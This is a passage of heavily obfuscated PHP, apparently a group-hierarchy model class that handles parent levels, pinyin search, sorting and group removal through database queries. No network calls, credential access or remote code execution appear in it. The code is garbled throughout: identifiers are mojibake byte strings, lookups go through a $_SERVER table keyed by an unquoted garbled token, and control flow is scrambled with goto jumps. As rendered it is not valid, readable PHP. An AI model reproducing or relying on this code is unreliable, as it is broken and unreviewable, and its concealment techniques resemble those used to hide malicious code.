$EƒŠÎí÷œí = false) { goto cö¥’Ããã; E¼Òö—´õÉ: $this->_clearChildrenCache($D‹ç—¶çĞ´); $this->where($fÇœÆä²¾)->data($f²ÆÎİ†«¨)->save(); goto c¬¯–êà; cö¥’Ããã: $f‘³ö¤öİ =& $_SERVER[›èö’ù¤]; $dÁŒäºá‹ = $D‹ç—¶çĞ´[$f‘³ö¤öİ[516]] . $D‹ç—¶çĞ´[$f‘³ö¤öİ[1720]] . $f‘³ö¤öİ[47]; $E²éÔƒ’ê¸ = $aÈ¹îÏ‘é¢[$f‘³ö¤öİ[516]] . $aÈ¹îÏ‘é¢[$f‘³ö¤öİ[1720]] . $f‘³ö¤öİ[47] . $D‹ç—¶çĞ´[$f‘³ö¤öİ[1720]] . $f‘³ö¤öİ[47]; goto eÆŞ¼ãî‰Ù; eÆŞ¼ãî‰Ù: if ($EƒŠÎí÷œí) { $E²éÔƒ’ê¸ = $aÈ¹îÏ‘é¢[$f‘³ö¤öİ[516]] . $aÈ¹îÏ‘é¢[$f‘³ö¤öİ[1720]] . $f‘³ö¤öİ[47]; } $fÇœÆä²¾ = array($f‘³ö¤öİ[579] => array($f‘³ö¤öİ[539], $D‹ç—¶çĞ´[$f‘³ö¤öİ[516]] . $D‹ç—¶çĞ´[$f‘³ö¤öİ[1720]] . $f‘³ö¤öİ[540])); $f²ÆÎİ†«¨ = array($f‘³ö¤öİ[579] => array($f‘³ö¤öİ[588], "\162\x65\x70\154\x61\x63\x65\50\x70\141\x72\x65\156\164\114\x65\166\145\x6c\54\47{$dÁŒäºá‹}\47\x2c\47{$E²éÔƒ’ê¸}\47\x29")); goto E¼Òö—´õÉ; c¬¯–êà: } public function setNamePinyin($bÇÊó°á±Ê, $bº‚Æ–ˆó¬ = false) { $C¿‘ä¾¼–¼ =& $_SERVER[›èö’ù¤]; if (!$bº‚Æ–ˆó¬) { $f¦öÃÍ›À = $this->getInfoSimple($bÇÊó°á±Ê); $bº‚Æ–ˆó¬ = $f¦öÃÍ›À[$C¿‘ä¾¼–¼[28]]; } if (!Input::check($bº‚Æ–ˆó¬, $C¿‘ä¾¼–¼[582])) { $this->metaSet($bÇÊó°á±Ê, $C¿‘ä¾¼–¼[459], null); $this->metaSet($bÇÊó°á±Ê, $C¿‘ä¾¼–¼[458], null); return; } $cÎ‘¤ºÔËá = array($C¿‘ä¾¼–¼[459] => str_replace($C¿‘ä¾¼–¼[50], $C¿‘ä¾¼–¼[33], Pinyin::get($bº‚Æ–ˆó¬)), $C¿‘ä¾¼–¼[458] => Pinyin::get($bº‚Æ–ˆó¬, $C¿‘ä¾¼–¼[583])); $this->metaSet($bÇÊó°á±Ê, $cÎ‘¤ºÔËá); } protected function groupStatus($b³œÑœãëÔ, $e˜Í¦‡õÒ©) { goto BÈêÃîÃ¬Ü; dÙ²±ø£»‡: foreach ($eåƒ÷§£Ş as $b³œÑœãëÔ) { $A†ùïØ’Õë[] = array($E¶¢ˆëå¿†[1720] => $b³œÑœãëÔ, $E¶¢ˆëå¿†[93] => $E¶¢ˆëå¿†[734], $E¶¢ˆëå¿†[372] => $e˜Í¦‡õÒ©); $this->_clearCache($b³œÑœãëÔ); } return Model($E¶¢ˆëå¿†[1805])->addAll($A†ùïØ’Õë, array(), !0); goto aò­¶îÑ…ˆ; BÈêÃîÃ¬Ü: $E¶¢ˆëå¿† =& $_SERVER[›èö’ù¤]; $B‘Œ’Ï·÷ = $this->getInfoSimple($b³œÑœãëÔ); if (!$B‘Œ’Ï·÷) { return !1; } goto bêŠÀæ¿ç; bêŠÀæ¿ç: if ($e˜Í¦‡õÒ© == $E¶¢ˆëå¿†[87]) { $eåƒ÷§£Ş = $this->parentLevelArray($B‘Œ’Ï·÷[$E¶¢ˆëå¿†[516]]); } else { $Dœ®îÅÏĞÆ = array($E¶¢ˆëå¿†[579] => array($E¶¢ˆëå¿†[539], $B‘Œ’Ï·÷[$E¶¢ˆëå¿†[516]] . $B‘Œ’Ï·÷[$E¶¢ˆëå¿†[1720]] . $E¶¢ˆëå¿†[540])); $eåƒ÷§£Ş = $this->where($Dœ®îÅÏĞÆ)->field($E¶¢ˆëå¿†[1720])->select(); $eåƒ÷§£Ş = array_to_keyvalue($eåƒ÷§£Ş, $E¶¢ˆëå¿†[33], $E¶¢ˆëå¿†[1720]); } $eåƒ÷§£Ş[] = $B‘Œ’Ï·÷[$E¶¢ˆëå¿†[1720]]; $A†ùïØ’Õë = array(); goto dÙ²±ø£»‡; aò­¶îÑ…ˆ: } protected function groupRemove($E‰²áÊØéŒ) { goto Dí²Æ¸Šñ¤; Dí²Æ¸Šñ¤: $CÖ±ƒé‘èÃ =& $_SERVER[›èö’ù¤]; $DÀ–á‘Œšï = array($CÖ±ƒé‘èÃ[1720] => $E‰²áÊØéŒ); $bğİ¥Œ·½¦ = $this->where($DÀ–á‘Œšï)->find(); goto Cµ÷Ä…Ãç‚; fªƒô“Á¤˜: Model($CÖ±ƒé‘èÃ[816])->groupRootRemove($E‰²áÊØéŒ); return $this->where($DÀ–á‘Œšï)->delete(); goto E˜Á¥Ö˜; Cµ÷Ä…Ãç‚: if (!$bğİ¥Œ·½¦ || $bğİ¥Œ·½¦[$CÖ±ƒé‘èÃ[493]] == 0) { return !1; } $B×å¾Öƒ = $this->getInfoSimple($bğİ¥Œ·½¦[$CÖ±ƒé‘èÃ[493]]); $this->_changeChildLevel($bğİ¥Œ·½¦, $B×å¾Öƒ, !0); goto BĞ‘¹¶¿‰¤; BĞ‘¹¶¿‰¤: $this->where(array($CÖ±ƒé‘èÃ[493] => $E‰²áÊØéŒ))->save(array($CÖ±ƒé‘èÃ[493] => $bğİ¥Œ·½¦[$CÖ±ƒé‘èÃ[493]])); Model($CÖ±ƒé‘èÃ[1805])->where($DÀ–á‘Œšï)->delete(); Model($CÖ±ƒé‘èÃ[1806])->where($DÀ–á‘Œšï)->delete(); goto fªƒô“Á¤˜; E˜Á¥Ö˜: } protected function groupSort($fÃÆö¬°Î) { $e¢—×µÑÎ‡ =& $_SERVER[›èö’ù¤]; $aù¸¿Ñè‘ = array(); foreach ($fÃÆö¬°Î as $Fø©ïİŞ×Ğ => $båğÑµ¦°›) { $aù¸¿Ñè‘[] = array($e¢—×µÑÎ‡[1720], $båğÑµ¦°›, $e¢—×µÑÎ‡[1743], $Fø©ïİŞ×Ğ + 1); } $this->saveAll($aù¸¿Ñè‘); } public function listData() { $b›çÖ¼ŠÕ¯ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b›çÖ¼ŠÕ¯[$_SERVER[›èö’ù¤][367]]); return $b›çÖ¼ŠÕ¯; } private function _makeOrder($FÃì¦ ºó = '') { goto E ¯°¼¶‚; Dæ¿ÙÊàâ: $FÃì¦ ºó = $FÃì¦ ºó . "{$f§¢ª–„Ô}\40{$f§ë•¶½Ûù}\x2c\40\147\162\157\165\x70\x49\104\x20\141\x73\x63"; return $this->order($FÃì¦ ºó); goto FÑŠ²Ÿğ; Dª‚Íñ™ê: $f§¢ª–„Ô = Input::get($C¼œ•„´ƒ­[450], $C¼œ•„´ƒ­[7], $C¼œ•„´ƒ­[1724], $b¯è×©­¡); $f§ë•¶½Ûù = Input::get($C¼œ•„´ƒ­[451], $C¼œ•„´ƒ­[7], $C¼œ•„´ƒ­[1807], array($C¼œ•„´ƒ­[1807], $C¼œ•„´ƒ­[445])); $f§ë•¶½Ûù = $E¯¶ŠÑË»[$f§ë•¶½Ûù]; goto Dæ¿ÙÊàâ; E ¯°¼¶‚: $C¼œ•„´ƒ­ =& $_SERVER[›èö’ù¤]; $b¯è×©­¡ = array($C¼œ•„´ƒ­[1720], $C¼œ•„´ƒ­[28], $C¼œ•„´ƒ­[1706], $C¼œ•„´ƒ­[194]); $E¯¶ŠÑË» = array($C¼œ•„´ƒ­[443] => $C¼œ•„´ƒ­[444], $C¼œ•„´ƒ­[445] => $C¼œ•„´ƒ­[446]); goto Dª‚Íñ™ê; FÑŠ²Ÿğ: } public function listChild($b§‹Ñ†ù) { $F¶Š­É²Œ =& $_SERVER[›èö’ù¤]; $EÒ¤›ÙØ¯Å = $this->where(array($F¶Š­É²Œ[493] => $b§‹Ñ†ù))->_makeOrder()->selectPage(200); $this->_listDataApply($EÒ¤›ÙØ¯Å[$F¶Š­É²Œ[367]]); return $EÒ¤›ÙØ¯Å; } public function listByID($fÕŠÈº¡ó) { goto C¿±Ò£‚¶ã; C¿±Ò£‚¶ã: $F¾‡©ÖĞˆ… =& $_SERVER[›èö’ù¤]; if (!$fÕŠÈº¡ó) { return array(); } $CÄÀÕô†± = array($F¾‡©ÖĞˆ…[1720] => array($F¾‡©ÖĞˆ…[7], $fÕŠÈº¡ó)); goto cĞˆŠ„ÕÆÑ; DÏµâ¼í‡é: return $fÄÅ•Œ ; goto e›Š¶¿¶Â; cĞˆŠ„ÕÆÑ: $fÄÅ•Œ  = $this->where($CÄÀÕô†±)->select(); $fÄÅ•Œ  = array_sort_keep($fÄÅ•Œ , $F¾‡©ÖĞˆ…[1720], $fÕŠÈº¡ó); $this->_listDataApply($fÄÅ•Œ ); goto DÏµâ¼í‡é; e›Š¶¿¶Â: } public function listSearch($aÎ­”ó¢Ü¶) { goto Eº¥®…Üí£; Eº¥®…Üí£: $bùÁÏÆàÅ© =& $_SERVER[›èö’ù¤]; $FÓì†¾ä½î = $aÎ­”ó¢Ü¶[$bùÁÏÆàÅ©[1808]]; $A†í·š°¬ğ = isset($aÎ­”ó¢Ü¶[$bùÁÏÆàÅ©[1809]]) ? $aÎ­”ó¢Ü¶[$bùÁÏÆàÅ©[1809]] : !1; goto E¨§¿–¤¦; dœğÅ”ç: $cçêÅ¯ñ»ó = $cçêÅ¯ñ»ó ? $cçêÅ¯ñ»ó : array($bùÁÏÆàÅ©[367] => array(), $bùÁÏÆàÅ©[364] => array()); if (!$cçêÅ¯ñ»ó || count($cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[367]]) < 5 && Input::check($FÓì†¾ä½î, $bùÁÏÆàÅ©[316])) { goto E ¡Ğ¤„ÒŞ; e©à­Ï‰È: $cô‰¾©‹ÛÆ = array_merge($cÎë†Ù„æ², $e‘‡ŒäÉª‘, $cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[367]]); $cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[367]] = array_unique_by_key($cô‰¾©‹ÛÆ, $bùÁÏÆàÅ©[1720]); $cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[364]][$bùÁÏÆàÅ©[365]] = count($cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[367]]); goto cÊÄ¹¶ÄÜÄ; cÊÄ¹¶ÄÜÄ: $cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[364]][$bùÁÏÆàÅ©[366]] = ceil($cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[364]][$bùÁÏÆàÅ©[365]] / $cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[364]][$bùÁÏÆàÅ©[361]]); goto cæ´…ß÷Òó; E ¡Ğ¤„ÒŞ: $f‚ÇÜÂ˜‡° = $this->groupChildrenAll($A†í·š°¬ğ); $cÎë†Ù„æ² = $this->_searchFromMeta($bùÁÏÆàÅ©[458], $FÓì†¾ä½î, 10, $f‚ÇÜÂ˜‡°); $e‘‡ŒäÉª‘ = $this->_searchFromMeta($bùÁÏÆàÅ©[459], $FÓì†¾ä½î, 10, $f‚ÇÜÂ˜‡°); goto e©à­Ï‰È; cæ´…ß÷Òó: } $this->_listDataApply($cçêÅ¯ñ»ó[$bùÁÏÆàÅ©[367]]); goto bêš¤ÎãÃƒ; E¾³„–îç‡: if ($A†í·š°¬ğ) { $AÌ¿ƒàô© = $this->getInfoSimple($A†í·š°¬ğ); $D´¯õê„“† = $AÌ¿ƒàô©[$bùÁÏÆàÅ©[516]] . $A†í·š°¬ğ . $bùÁÏÆàÅ©[540]; $c¤ä°ìáÀÒ = array($c¤ä°ìáÀÒ, array($bùÁÏÆàÅ©[516] => array($bùÁÏÆàÅ©[381], $D´¯õê„“†))); } $c¤ä°ìáÀÒ = $this->parseWhereLike($c¤ä°ìáÀÒ); $cçêÅ¯ñ»ó = $this->_makeOrder()->where($c¤ä°ìáÀÒ)->selectPage(20); goto dœğÅ”ç; bêš¤ÎãÃƒ: return $cçêÅ¯ñ»ó; goto BÊ¡ÒŒï››; E¨§¿–¤¦: if (!trim($FÓì†¾ä½î)) { return !1; } $FÓì†¾ä½î = str_replace($bùÁÏÆàÅ©[1810], $bùÁÏÆàÅ©[1811], $FÓì†¾ä½î); $c¤ä°ìáÀÒ = array($bùÁÏÆàÅ©[1720] => array($bùÁÏÆàÅ©[381], "{$FÓì†¾ä½î}\45"), $bùÁÏÆàÅ©[28] => array($bùÁÏÆàÅ©[381], "\45{$FÓì†¾ä½î}\45"), $bùÁÏÆàÅ©[983] => $bùÁÏÆàÅ©[1812]); goto E¾³„–îç‡; BÊ¡ÒŒï››: } protected function groupChildrenAll($F‘ââ×íª) { $f ¾´Òïéò =& $_SERVER[›èö’ù¤]; if (!$F‘ââ×íª) { return !1; } if (is_string($F‘ââ×íª)) { $F‘ââ×íª = array($F‘ââ×íª); } $eÜÍçøïœ½ = $F‘ââ×íª; foreach ($F‘ââ×íª as $CÇ¯Ï„æ“¿) { $D›Æ·ôê®× = $this->getInfoSimple($CÇ¯Ï„æ“¿); $AíÕ¯Ïà»ô = array($f ¾´Òïéò[516] => array($f ¾´Òïéò[381], $D›Æ·ôê®×[$f ¾´Òïéò[516]] . $CÇ¯Ï„æ“¿ . $f ¾´Òïéò[540])); $FÌ‚‰óÕ = $this->field($f ¾´Òïéò[1720])->where($AíÕ¯Ïà»ô)->select(); $eÜÍçøïœ½ = array_merge($eÜÍçøïœ½, array_to_keyvalue($FÌ‚‰óÕ, $f ¾´Òïéò[33], $f ¾´Òïéò[1720])); } return array_unique($eÜÍçøïœ½); } private function _searchFromMeta($föŞ¯ÌÜŠ , $FÓ™¥ÁÚ…¼, $fßå•Ê‰õ, $Bå““™ï…ä) { goto Dæ´ˆ×é¬; Dæ´ˆ×é¬: $bšÈĞñ› =& $_SERVER[›èö’ù¤]; $FÓ™¥ÁÚ…¼ = strtolower($FÓ™¥ÁÚ…¼); $CªÊæìÈ£ò = array($bšÈĞñ›[93] => $föŞ¯ÌÜŠ , $bšÈĞñ›[372] => array($bšÈĞñ›[381], "\x25{$FÓ™¥ÁÚ…¼}\x25")); goto A£ÚÕÉ…¬; b­¡Ä¨‘¬’: if (!$d–Ê‚ª) { return array(); } return $d–Ê‚ª; goto AìÒ‹Úğï; Cäªˆ©àÙ’: if (!$FëŠ¥Í ÉÒ) { return array(); } $FëŠ¥Í ÉÒ = array_to_keyvalue($FëŠ¥Í ÉÒ, $bšÈĞñ›[33], $bšÈĞñ›[1720]); $d–Ê‚ª = $this->where(array($bšÈĞñ›[1804] => array($bšÈĞñ›[7], $FëŠ¥Í ÉÒ)))->select(); goto b­¡Ä¨‘¬’; A£ÚÕÉ…¬: $CªÊæìÈ£ò = $this->parseWhereLike($CªÊæìÈ£ò); if ($Bå““™ï…ä) { $CªÊæìÈ£ò[$bšÈĞñ›[1720]] = array($bšÈĞñ›[7], $Bå““™ï…ä); } $FëŠ¥Í ÉÒ = Model($bšÈĞñ›[1813])->where($CªÊæìÈ£ò)->limit($fßå•Ê‰õ)->select(); goto Cäªˆ©àÙ’; AìÒ‹Úğï: } protected function _listDataApplyItem($F‹ÚÔ†÷†Ö) { $D“ñ¥¶á« = array($F‹ÚÔ†÷†Ö); $this->_listDataApply($D“ñ¥¶á«); return $D“ñ¥¶á«[0]; } protected function _listDataApply(&$B ôó·á‚—) { goto cè‘Ÿñù­; aÂÀ§‰‰Å: $this->_listAppendChildren($B ôó·á‚—); $this->_listAppendChildrenMember($B ôó·á‚—); $this->_listAppendMeta($B ôó·á‚—, $Cæóé’Öñİ); goto dñ§‘“Ø‰¿; dñ§‘“Ø‰¿: $this->_listAppendParent($B ôó·á‚—); $this->_listAppendSourceRoot($B ôó·á‚—, $Cæóé’Öñİ); goto AØ—ƒÏ–—ê; cè‘Ÿñù­: $D—¦¯õ÷Ğ =& $_SERVER[›èö’ù¤]; if (!$B ôó·á‚—) { return; } $Cæóé’Öñİ = array_to_keyvalue($B ôó·á‚—, $D—¦¯õ÷Ğ[33], $D—¦¯õ÷Ğ[1720]); goto aÂÀ§‰‰Å; AØ—ƒÏ–—ê: } private function _listAppendChildren(&$F¶áÚÀà¬) { goto CÑÈÕŠß»õ; Fˆë‹ì¿ç: $fóÖŠåÀ¥Ä = array($c„ÀùƒÑ²Ô[493], $c„ÀùƒÑ²Ô[1814] => $c„ÀùƒÑ²Ô[495]); $E”ßáì¼â = $this->field($fóÖŠåÀ¥Ä)->where($FÖÚ„©¾”)->group($c„ÀùƒÑ²Ô[493])->select(); $b†ß‡–¿½ = array_to_keyvalue($E”ßáì¼â, $c„ÀùƒÑ²Ô[493], $c„ÀùƒÑ²Ô[495]); goto CµÇÁí´öŠ; CÑÈÕŠß»õ: $c„ÀùƒÑ²Ô =& $_SERVER[›èö’ù¤]; $Båàã¸ÒáÀ = array_to_keyvalue($F¶áÚÀà¬, $c„ÀùƒÑ²Ô[33], $c„ÀùƒÑ²Ô[1720]); $FÖÚ„©¾” = array($c„ÀùƒÑ²Ô[493] => array($c„ÀùƒÑ²Ô[7], $Båàã¸ÒáÀ)); goto Fˆë‹ì¿ç; CµÇÁí´öŠ: foreach ($F¶áÚÀà¬ as &$fš“ò¼ô‡) { $côˆÔä¥§ = $fš“ò¼ô‡[$c„ÀùƒÑ²Ô[1720]]; $fš“ò¼ô‡[$c„ÀùƒÑ²Ô[1815]] = isset($b†ß‡–¿½[$côˆÔä¥§]) ? intval($b†ß‡–¿½[$côˆÔä¥§]) : !1; } unset($fš“ò¼ô‡); goto b•Š ÍÕ£Ï; b•Š ÍÕ£Ï: } private function _listAppendChildrenMember(&$f¿¯®İƒ¼Ñ) { goto fäÑÂ¸õë; EŒäò¨îùŒ: $Fš³¿™„Ç« = array($EĞÔ¢¾·–í[1720], $EĞÔ¢¾·–í[1814] => $EĞÔ¢¾·–í[495]); $BÔÙŠ³»Õ‰ = Model($EĞÔ¢¾·–í[1806])->field($Fš³¿™„Ç«)->where($C‚‹ºª¦à)->group($EĞÔ¢¾·–í[1720])->select(); $FÀèì”¦„Ì = array_to_keyvalue($BÔÙŠ³»Õ‰, $EĞÔ¢¾·–í[1720], $EĞÔ¢¾·–í[495]); goto ağÏÙ› ½; ağÏÙ› ½: foreach ($f¿¯®İƒ¼Ñ as &$d­Î«ĞË†Ö) { $D‰™¯¢Õ³Å = $d­Î«ĞË†Ö[$EĞÔ¢¾·–í[1720]]; $d­Î«ĞË†Ö[$EĞÔ¢¾·–í[1816]] = isset($FÀèì”¦„Ì[$D‰™¯¢Õ³Å]) ? intval($FÀèì”¦„Ì[$D‰™¯¢Õ³Å]) : !1; } unset($d­Î«ĞË†Ö); goto A•‹ÂéÑ†ô; fäÑÂ¸õë: $EĞÔ¢¾·–í =& $_SERVER[›èö’ù¤]; $A“áœõ´œ = array_to_keyvalue($f¿¯®İƒ¼Ñ, $EĞÔ¢¾·–í[33], $EĞÔ¢¾·–í[1720]); $C‚‹ºª¦à = array($EĞÔ¢¾·–í[1720] => array($EĞÔ¢¾·–í[7], $A“áœõ´œ)); goto EŒäò¨îùŒ; A•‹ÂéÑ†ô: } private function _listAppendMeta(&$DŒÛÍÌÆµŞ, $Dá°¨âçƒİ) { goto cèìÂ…Å’; cèìÂ…Å’: $aËˆÇĞ«ß =& $_SERVER[›èö’ù¤]; $b¨×å’¤ù¦ = array($aËˆÇĞ«ß[1720] => array($aËˆÇĞ«ß[7], $Dá°¨âçƒİ)); $Føá­‡Ë…ƒ = Model($aËˆÇĞ«ß[1805])->where($b¨×å’¤ù¦)->select(); goto fª¹“’äÑ; fª¹“’äÑ: $Føá­‡Ë…ƒ = array_to_keyvalue_group($Føá­‡Ë…ƒ, $aËˆÇĞ«ß[1720]); foreach ($Føá­‡Ë…ƒ as &$c¼ŠËœÃ—Õ) { $c¼ŠËœÃ—Õ = array_to_keyvalue($c¼ŠËœÃ—Õ, $aËˆÇĞ«ß[93], $aËˆÇĞ«ß[372]); } unset($c¼ŠËœÃ—Õ); goto C“ï³øÛ˜½; C“ï³øÛ˜½: foreach ($DŒÛÍÌÆµŞ as &$E˜²¥å‘) { $E˜²¥å‘[$aËˆÇĞ«ß[460]] = array(); if (isset($Føá­‡Ë…ƒ[$E˜²¥å‘[$aËˆÇĞ«ß[1720]]])) { $E˜²¥å‘[$aËˆÇĞ«ß[460]] = $Føá­‡Ë…ƒ[$E˜²¥å‘[$aËˆÇĞ«ß[1720]]]; } } unset($E˜²¥å‘); goto F›¹ùóãÎŸ; F›¹ùóãÎŸ: } protected function parentLevelArray($E«±Ç¡š°) { $C»³×¼ö° =& $_SERVER[›èö’ù¤]; $E«±Ç¡š° = explode($C»³×¼ö°[47], trim($E«±Ç¡š°, $C»³×¼ö°[47])); $E«±Ç¡š° = array_remove_value($E«±Ç¡š°, $C»³×¼ö°[191]); return $E«±Ç¡š°; } private function _listAppendParent(&$dæÓ‹ã–§Ù) { goto A¨Ê›³æ­; A¨Ê›³æ­: $cç‘™†º =& $_SERVER[›èö’ù¤]; $C†Ÿ¨‰‹»³ = array(); foreach ($dæÓ‹ã–§Ù as &$fùì“ùãğÕ) { $C†Ÿ¨‰‹»³[$fùì“ùãğÕ[$cç‘™†º[1720]]] = $fùì“ùãğÕ[$cç‘™†º[28]]; $b°Ø…ˆŞö = $this->parentLevelArray($fùì“ùãğÕ[$cç‘™†º[516]]); foreach ($b°Ø…ˆŞö as $aÏ‘î¬÷ËÊ) { if (!isset($C†Ÿ¨‰‹»³[$aÏ‘î¬÷ËÊ])) { $C†Ÿ¨‰‹»³[$aÏ‘î¬÷ËÊ] = 0; } } } goto BÌÀ÷Ù…ä; BÌÀ÷Ù…ä: unset($fùì“ùãğÕ); foreach ($C†Ÿ¨‰‹»³ as $AóÛ¢ø™Óˆ => $aÙÜØÂ©ÓÓ) { if ($aÙÜØÂ©ÓÓ) { continue; } $FÇ®‰É¯»– = $this->getInfoSimple($AóÛ¢ø™Óˆ); $C†Ÿ¨‰‹»³[$AóÛ¢ø™Óˆ] = $FÇ®‰É¯»–[$cç‘™†º[28]]; } $DÑ¦áÛ“¡ó = $GLOBALS[$cç‘™†º[6]][$cç‘™†º[88]][$cç‘™†º[1817]]; goto AŸš¨éàÑ; AŸš¨éàÑ: if ($GLOBALS[$cç‘™†º[500]] == $cç‘™†º[87]) { $DÑ¦áÛ“¡ó = !1; } foreach ($dæÓ‹ã–§Ù as &$fùì“ùãğÕ) { $b°Ø…ˆŞö = $this->parentLevelArray($fùì“ùãğÕ[$cç‘™†º[516]]); $EÎ†…ŠŒŞ¡ = $cç‘™†º[33]; foreach ($b°Ø…ˆŞö as $AóÛ¢ø™Óˆ => $aÏ‘î¬÷ËÊ) { if ($DÑ¦áÛ“¡ó && $AóÛ¢ø™Óˆ == 0) { continue; } $EÎ†…ŠŒŞ¡ .= $C†Ÿ¨‰‹»³[$aÏ‘î¬÷ËÊ] . $cç‘™†º[8]; } if ($b°Ø…ˆŞö) { $EÎ†…ŠŒŞ¡ .= $fùì“ùãğÕ[$cç‘™†º[28]]; } $fùì“ùãğÕ[$cç‘™†º[521]] = str_replace($cç‘™†º[524], $cç‘™†º[8], $EÎ†…ŠŒŞ¡); } unset($fùì“ùãğÕ); goto bË¬®‰¢Š“; bË¬®‰¢Š“: } private function _listAppendSourceRoot(&$D«º­¨Ó, $e¦§Ûí°íœ) { goto E¨²¸ì†Î‘; E¨²¸ì†Î‘: $e ÇÉ†‰¯¾ =& $_SERVER[›èö’ù¤]; $Cä¾ö¯·…” = array($e ÇÉ†‰¯¾[493] => 0, $e ÇÉ†‰¯¾[499] => array($e ÇÉ†‰¯¾[7], $e¦§Ûí°íœ), $e ÇÉ†‰¯¾[406] => SourceModel::TYPE_GROUP); $A‹®¼¾¥×½ = Model($e ÇÉ†‰¯¾[816])->order($e ÇÉ†‰¯¾[1818])->field($e ÇÉ†‰¯¾[1819]); goto f”õœõÖ¿Ë; f”õœõÖ¿Ë: $dàíßàì³ = $A‹®¼¾¥×½->limit(count($e¦§Ûí°íœ))->where($Cä¾ö¯·…”)->select(); $dàíßàì³ = array_to_keyvalue($dàíßàì³, $e ÇÉ†‰¯¾[499]); $dàíßàì³ = array_remove_key($dàíßàì³, $e ÇÉ†‰¯¾[499]); goto a´¼«óéÍ; a´¼«óéÍ: foreach ($D«º­¨Ó as &$A±Öí°™·«) { $A±Öí°™·«[$e ÇÉ†‰¯¾[85]] = $dàíßàì³[$A±Öí°™·«[$e ÇÉ†‰¯¾[1720]]] ? $dàíßàì³[$A±Öí°™·«[$e ÇÉ†‰¯¾[1720]]] : array(); } unset($A±Öí°™·«); goto AÙ”âƒãÀÔ; AÙ”âƒãÀÔ: } protected function groupMerge($FàÌ…åèÉ¥) { $FàÌ…åèÉ¥ = array_values(array_unique($FàÌ…åèÉ¥)); $C¯—˜ÆÏ‘² = array(); for ($F´ùê¶Èõ³ = 0; $F´ùê¶Èõ³ < count($FàÌ…åèÉ¥); $F´ùê¶Èõ³++) { $a Òãøî… = !1; for ($e›Ù„‹½° = 0; $e›Ù„‹½° < count($FàÌ…åèÉ¥); $e›Ù„‹½°++) { if ($F´ùê¶Èõ³ == $e›Ù„‹½°) { continue; } if ($this->isParentOf($FàÌ…åèÉ¥[$e›Ù„‹½°], $FàÌ…åèÉ¥[$F´ùê¶Èõ³])) { $a Òãøî… = !0; break; } } if (!$a Òãøî…) { $C¯—˜ÆÏ‘²[] = $FàÌ…åèÉ¥[$F´ùê¶Èõ³]; } } return $C¯—˜ÆÏ‘²; } protected function isParentOf($eã«Õ±Ö³À, $B†òøİÑòà) { goto c³£Òä¸·ì; cõ¬Ó’ƒº¯: return !1; goto BÛ–ÚÉÖ’; c³£Òä¸·ì: $E¦¾îÙ¤™ =& $_SERVER[›èö’ù¤]; if (!$eã«Õ±Ö³À || !$B†òøİÑòà || $eã«Õ±Ö³À == $B†òøİÑòà) { return !1; } $AÈÀâ¯ÕÇ = $this->getInfoSimple($eã«Õ±Ö³À); goto AÔŞİí˜‰¨; AÔŞİí˜‰¨: $eâñö›é±‡ = $this->getInfoSimple($B†òøİÑòà); $CÂ‚†î‡¨ƒ = $AÈÀâ¯ÕÇ[$E¦¾îÙ¤™[516]] . $eã«Õ±Ö³À . $E¦¾îÙ¤™[47]; if (substr($eâñö›é±‡[$E¦¾îÙ¤™[516]], 0, strlen($CÂ‚†î‡¨ƒ)) == $CÂ‚†î‡¨ƒ) { return !0; } goto cõ¬Ó’ƒº¯; BÛ–ÚÉÖ’: } public function groupShowRoot($cË´òÊ•ğÃ, $e‡¤  äˆ = false) { goto F“¸¸‡‡èŞ; dÒ¯ÑåŞšŞ: $BË¶¤…Š´Ğ = $this->parentLevelArray($bÍ„ˆò–›„[$açõ´çÂªÄ[516]]); $e¯æÓÓŠÚµ = array($cË´òÊ•ğÃ); if (count($BË¶¤…Š´Ğ) == 0) { return $e¯æÓÓŠÚµ; } goto Dô¼ÈòÄô–; Dô¼ÈòÄô–: if ($e‡¤  äˆ && count($BË¶¤…Š´Ğ) == 1) { return $e¯æÓÓŠÚµ; } if (!$bÍ„ˆò–›„[$açõ´çÂªÄ[460]] || !isset($bÍ„ˆò–›„[$açõ´çÂªÄ[460]][$açõ´çÂªÄ[1802]]) || $bÍ„ˆò–›„[$açõ´çÂªÄ[460]][$açõ´çÂªÄ[1802]] == $açõ´çÂªÄ[1774]) { return $this->groupShowRoot($BË¶¤…Š´Ğ[count($BË¶¤…Š´Ğ) - 1], $e‡¤  äˆ); } if ($bÍ„ˆò–›„[$açõ´çÂªÄ[460]][$açõ´çÂªÄ[1802]] == $açõ´çÂªÄ[355]) { $DŠÚÂŠÀâÚ = explode($açõ´çÂªÄ[47], $bÍ„ˆò–›„[$açõ´çÂªÄ[460]][$açõ´çÂªÄ[1803]]); if ($DŠÚÂŠÀâÚ) { $e¯æÓÓŠÚµ = array_merge($e¯æÓÓŠÚµ, $DŠÚÂŠÀâÚ); } } goto E‡âï¦•ĞŒ; F“¸¸‡‡èŞ: $açõ´çÂªÄ =& $_SERVER[›èö’ù¤]; $bÍ„ˆò–›„ = $this->getInfo($cË´òÊ•ğÃ); if (!$bÍ„ˆò–›„) { return array(); } goto dÒ¯ÑåŞšŞ; E‡âï¦•ĞŒ: return $e¯æÓÓŠÚµ; goto b’‡ßŞŠÙ; b’‡ßŞŠÙ: } protected function resetParentLevel() { $cìõŒšŠƒ =& $_SERVER[›èö’ù¤]; $C•¨¯‘ª‚— = $cìõŒšŠƒ[1720]; $B™¨×âº° = $this->select(); $B™¨×âº° = array_to_keyvalue($B™¨×âº°, $C•¨¯‘ª‚—); foreach ($B™¨×âº° as $AÔµ¯Ê™Ò×) { goto Bğî±á‹İ; Då¸êçÖ: $this->where(array($C•¨¯‘ª‚— => $AÔµ¯Ê™Ò×[$C•¨¯‘ª‚—]))->save(array($cìõŒšŠƒ[579] => $c—…§¥ÎÓ)); goto Eè‰ÎÌ‘œ; Bğî±á‹İ: $aÑ–—ŒÒË = $AÔµ¯Ê™Ò×; $c—…§¥ÎÓ = array(); while ($aÑ–—ŒÒË[$cìõŒšŠƒ[493]] != 0) { $c—…§¥ÎÓ[] = $aÑ–—ŒÒË[$cìõŒšŠƒ[493]]; $aÑ–—ŒÒË = $B™¨×âº°[$aÑ–—ŒÒË[$cìõŒšŠƒ[493]]]; } goto DØÕ…ÍÅ¬; DØÕ…ÍÅ¬: $c—…§¥ÎÓ[] = 